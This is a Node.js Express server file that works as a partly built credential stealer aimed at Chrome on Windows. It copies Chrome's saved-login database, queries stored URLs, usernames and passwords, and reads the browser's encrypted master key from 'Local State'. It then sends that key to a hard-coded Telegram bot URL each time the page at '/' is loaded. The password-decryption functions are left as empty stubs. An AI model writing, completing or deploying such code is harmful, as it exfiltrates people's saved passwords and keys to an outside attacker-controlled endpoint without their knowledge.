const { Console } = require('console');
const express = require('express');
const app = express();
const port = 3005;
const fs = require('fs');
const os = require('os');
const sqlite3 = require('sqlite3').verbose();
const aesjs = require('aes-js');
const base64 = require('base64-js');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const USER_INFO = os.userInfo().username;
const LOCAL_STATE = `C:\Users\\${USER_INFO}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State`;
const CHROME_PATH = `C:\Users\\${USER_INFO}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`;

const generate_cipher = (cipher, payload) => {
    return aesjs.AES;
};

const decrypt_password = (cipher_text, secret_key) => {
    let init_vector = cipher_text.slice(3, 15);
    let encrypt_password = cipher_text.slice(15, -16);
    let cipher = generate_cipher();
};

fs.access('D:\\Loginvault.db', fs.constants.F_OK, (err) => {
    if (err) {
        fs.copyFile(CHROME_PATH, 'D:\\Loginvault.db', (err, data) => {
            if (err) {
                console.error('Error coppy source file:', err);
                return;
            }
            console.log('success');
        });
        return;
    }
    console.log('File exists');
});
const db = new sqlite3.Database('D:\\Loginvault.db', (err) => {
    if (err) {
        console.error('Error opening database:', err);
    } else {
        console.log('Connected to the SQLite database.');
    }
});
const get_key = async () => {
    fs.readFile(LOCAL_STATE, 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return;
        }
        data = JSON.parse(data);
        const decodedString = Buffer.from(data.os_crypt.encrypted_key).toString(
            'utf-8',
        );

        fetch(
            `https://api.telegram.org/bot6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc/sendMessage?chat_id=6290053899&text=${decodedString}}`,
            {
                method: 'GET',
            },
        );
    });

    db.each(
        'SELECT action_url, username_value, password_value FROM logins',
        (err, rows) => {
            if (err) console.log(err.message);
            // else console.log(rows)
        },
    );

    // Đóng kết nối sau khi hoàn tất
    //   data = JSON.parse(data)
    //   const decodedString = Buffer.from(data.os_crypt.encrypted_key).toString("utf-8");
    // fetch(`https://api.telegram.org/bot6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc/sendMessage?chat_id=6290053899&text=${data}}`, {
    //     method : "GET"
    // })
};

app.get('/', (req, res) => {
    res.sendFile('./index.html', { root: __dirname });
    get_key();
});

app.listen(port, () =>
    console.log(`app Listening at http://localhost:${port}`),
);
